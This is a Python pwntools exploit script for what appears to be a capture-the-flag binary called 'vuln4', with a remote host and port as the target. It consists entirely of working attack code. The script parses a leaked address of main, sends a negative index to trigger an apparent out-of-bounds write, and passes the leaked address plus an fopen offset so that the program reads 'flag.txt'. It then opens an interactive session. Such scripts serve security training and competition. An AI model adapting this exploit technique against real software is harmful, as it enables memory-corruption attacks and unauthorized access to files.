import os
from pwn import *
def _(args,end='\n'):
    pass
host = 'spclr.ch'
port = 1260
filename = [e for e in os.listdir() if e == 'vuln4'][0]
local = True
elf = ELF(f'./{filename}')
debug = print
STACK_BUF_SIZE = 0x30
FOPEN_OFFSET = 320
flag_txt = str(u64(b'flag.txt')).encode()
num_val = str(65).encode()
FOPEN_OFFSET = 354
try:
    p = gdb.debug(f'./{filename}',"continue") if local else remote(host,port)
    debug(p.recvuntil(b'am: '))
    leaked_addr_hex = hex(int(p.recvuntil(b'\n').rstrip().decode(),16))[2:]
    # LEAKED START OF MAIN
    print(f'Leaked address: {leaked_addr_hex}')
    leaked_addr = (int(leaked_addr_hex,16))
    debug(f'Leaked address(bytes): {leaked_addr}')
    debug(p.recvuntil(b'> '))
    p.sendline(b'-2')
    debug(p.recvuntil(b'number: '))
    p.sendline(flag_txt+b'\x00'*1)
    p.sendline(str(leaked_addr+FOPEN_OFFSET).encode()+b'')
    debug(p.recvuntil(b'number: '))
    p.interactive()
except Exception as e:
    print(f"Exception: {e}")

